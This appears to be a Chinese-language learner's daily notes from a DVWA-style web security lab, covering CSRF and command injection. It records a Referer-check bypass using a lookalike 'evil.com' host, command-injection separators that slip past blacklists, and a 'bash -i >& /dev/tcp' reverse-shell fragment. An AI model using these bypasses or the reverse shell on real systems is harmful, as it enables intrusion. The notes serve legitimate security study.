# 每日笔记

> 规则：每天学完写 5 行，不整理、不美化。当天写完就结束。
> 写不出来的就空着——**空着的地方，就是第二天该补的地方**。

格式固定五行：

- **学到了**：今天最核心的一个概念
- **踩的坑**：今天卡住 / 答错的地方
- **能做出来**：独立（不看书）能完成的操作
- **还不会**：今天没搞懂、留到明天的问题
- **一句话**：用一句话总结今天

## 11/01 CSRF

- **学到了**：CSRF 利用的是"浏览器自动带 Cookie 且分不清是否本人操作"
- **踩的坑**：Medium 一开始以为是 Referer 没发出去，后来用 Burp 手动加才测出真问题
- **能做出来**：Low 直接改 URL 改密码；Medium 用 `192.168.59.128.evil.com` 绕过
- **还不会**：Token 的具体生成机制
- **一句话**：Referer 可以撒谎，Token 不行

## 11/04 命令执行

- **学到了**：`;` 无条件执行，`&&` 有条件执行
- **踩的坑**：High 的源码是 `'| '`（带空格），我以为是竖线；输入框 `size` 写死缩放无效
- **能做出来**：`&` 绕过 Medium，`|`（无空格）绕过 High，`bash -i >& /dev/tcp` 反弹 shell
- **还不会**：拿到 shell 后第一件事做什么、怎么修 High
- **一句话**：黑名单永远不完整
